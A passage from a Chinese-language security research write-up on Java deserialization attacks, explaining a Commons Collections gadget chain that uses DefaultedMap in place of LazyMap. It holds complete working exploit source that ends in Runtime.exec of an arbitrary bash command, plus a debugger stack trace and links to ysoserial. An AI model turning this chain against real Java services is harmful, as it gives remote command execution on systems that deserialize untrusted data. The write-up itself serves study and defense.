利用链被阻断，猜他就是在某处过滤了这两个类，但没有干挠利用链上其他类。然后
作者找到一个LazyMap的替代品DefaultedMap，除了名字不同，对于利用链来说可以
将二者等价看待。从CTF出题角度看，这题出得挺好，以后有人出类似的题可以借鉴
这种思路。3.1没有DefaultedMap，3.2.1有。

8.9.1) DefaultedMapExecWithBadAttributeValueExpException.java

本质上对应"ysoserial/CommonsCollections5"，8u232可以得手，使用3.2.1版。这
是个单机版本。

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.2.1.jar" DefaultedMapExecWithBadAttributeValueExpException.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

/*
 * 从EvilClientWithBadAttributeValueExpException.java修改而来
 */
public class DefaultedMapExecWithBadAttributeValueExpException
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        Map             normalMap   = new HashMap();
        Map             defaultedMap
                                    = DefaultedMap.decorate( normalMap, tchain );
        TiedMapEntry    tme         = new TiedMapEntry( defaultedMap, null );
        BadAttributeValueExpException
                        bave        = new BadAttributeValueExpException( null );
        Field           f           = bave.getClass().getDeclaredField( "val" );
        f.setAccessible( true );
        f.set( bave, tme );
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( bave );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.2.1.jar:." \
DefaultedMapExecWithBadAttributeValueExpException "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:126), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:123), pc = 18
  [8] org.apache.commons.collections.map.DefaultedMap.get (DefaultedMap.java:187), pc = 31
  [9] org.apache.commons.collections.keyvalue.TiedMapEntry.getValue (TiedMapEntry.java:74), pc = 8
  [10] org.apache.commons.collections.keyvalue.TiedMapEntry.toString (TiedMapEntry.java:132), pc = 20
  [11] javax.management.BadAttributeValueExpException.readObject (BadAttributeValueExpException.java:86), pc = 97
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [21] DefaultedMapExecWithBadAttributeValueExpException.main (DefaultedMapExecWithBadAttributeValueExpException.java:90), pc = 279

这个调用栈回溯与"8.7.1) EvilClientWithBadAttributeValueExpException.java"
小节几乎一样，除了8号栈帧，一个是LazyMap，一个是DefaultedMap。

8.9.2) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  BadAttributeValueExpException.readObject
    TiedMapEntry.toString
      TiedMapEntry.getValue
        DefaultedMap.get    // 此处可以替换成LazyMap.get
          ChainedTransformer.transform
            InvokerTransformer.transform
--------------------------------------------------------------------------

☆ 参考资源

[49]
    Commons Collections Java反序列化漏洞深入分析 - KINGX [2015-11-20]
    https://kingx.me/commons-collections-java-deserialization.html

[50]
    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/
    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar

    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/
    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar

    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.2/
    https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar

    https://repo1.maven.org/maven2/org/apache/commons/commons-collections4/4.0/
    https://repo1.maven.org/maven2/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar

    https://repo1.maven.org/maven2/org/apache/commons/commons-collections4/4.1/
    https://repo1.maven.org/maven2/org/apache/commons/commons-collections4/4.1/commons-collections4-4.1.jar

    https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/1.9.2/
    https://repo1.maven.org/maven2/commons-beanutils/commons-beanutils/1.9.2/commons-beanutils-1.9.2.jar

[51]
    Java自定义注解 - [2018-01-03]
    https://www.jianshu.com/p/84c9fb948c3b

    JDK中注解的底层实现 - throwable [2018-10-06]
    https://www.cnblogs.com/throwable/p/9747595.html

[52]
    ysoserial
    https://github.com/frohoff/ysoserial/
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
    (A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization)
    (可以自己编译，不需要下这个jar包)

    git clone https://github.com/frohoff/ysoserial.git

[53]
    JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用 - iswin [2015-11-13]
    https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/
    (攻击链上用到java.net.URLClassLoader，可以干复杂的事，值得学习)

[54]
    PriorityQueue详解 - [2018-11-08]
    https://www.jianshu.com/p/f1fd9b82cb72

[56]
    Commons Collections3 新Map利用挖掘(WCTF出题笔记) - Meizj [2019-07-07]
    https://meizjm3i.github.io/2019/07/07/Commons-Collections%E6%96%B0%E5%88%A9%E7%94%A8%E9%93%BE%E6%8C%96%E6%8E%98%E5%8F%8AWCTF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%B2%E8%AE%B2/